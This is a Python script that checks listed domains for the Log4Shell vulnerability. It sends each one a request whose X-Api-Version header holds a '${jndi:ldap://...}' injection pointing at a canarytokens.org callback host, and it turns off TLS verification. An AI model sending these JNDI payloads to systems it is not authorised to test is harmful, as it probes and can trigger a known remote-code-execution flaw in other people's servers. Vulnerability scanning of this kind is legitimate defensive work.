"""
checkLog4J.py: 

Script checks provided domains for log4j vulnerability.
A token is created with canarytokens.org and passed as header at request for a single domain.
Every token is registered with provided email and the specific domain as note.
After the script completes check your email inbox for mails from canarytokens

IMPORTANT: have to be used with python3

USAGE: 
    - python3 checkLog4J.py --filepath <filepath> --email <email>
REQUIREMENTS: 
    - requests
"""

import requests
# disable ssl/tls verification for multiple unique requests
requests.packages.urllib3.disable_warnings() 
import argparse
import sys

class Log4J:
    def __init__(self, filePath, email):
        self.filePath = filePath
        self.email = email

    def readTxtFile(self):
        with open(self.filePath) as file:
            self.data = list(filter(lambda score: score != "", file.read().split("\n")))

    def sanitizeUrl(self, domain):
        if "https" not in domain:
            return f'https://{domain}'

        return domain

    def getCanaryToken(self, domain):
        requestJson = {
            "type": "log4shell",
            "email": self.email,
            "webhook" : "",
            "fmt": "",
            "memo": self.sanitizeUrl(domain),
            "clonedsite": "",
            "sql_server_table_name": "TABLE1",
            "sql_server_view_name": "VIEW1",
            "sql_server_function_name": "FUNCTION1",
            "sql_server_trigger_name": "TRIGGER1",
            "redirect_url": ""
        }

        responseJson = requests.post("https://canarytokens.org/generate", data=requestJson, verify=False).json()
        return responseJson["Hostname"]


    def checkDomain(self, domain, token):
        requestHeaders = {
            "X-Api-Version": "${jndi:ldap://"+ token + "/a}"
        }

        sanitizedDomain = self.sanitizeUrl(domain)
        try:
            requests.get(sanitizedDomain, headers=requestHeaders, verify=False, timeout=10)
        except:
            pass

    def check(self):
        self.readTxtFile()
        for domain in self.data:
            # make request for token
            token = self.getCanaryToken(domain)
            self.checkDomain(domain, token)
            print(f'Register {domain} with {token}/a')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Process log4j domains.')
    parser.add_argument('--filepath', dest="filepath", type=str,
                        help='txt file with domains')
    parser.add_argument('--email', dest="email", type=str, help="email to send results to")

    args = parser.parse_args()

    log4j = Log4J(args.filepath, args.email)
    log4j.check()
    print("Check done. Look at your email inbox.")
    sys.exit()
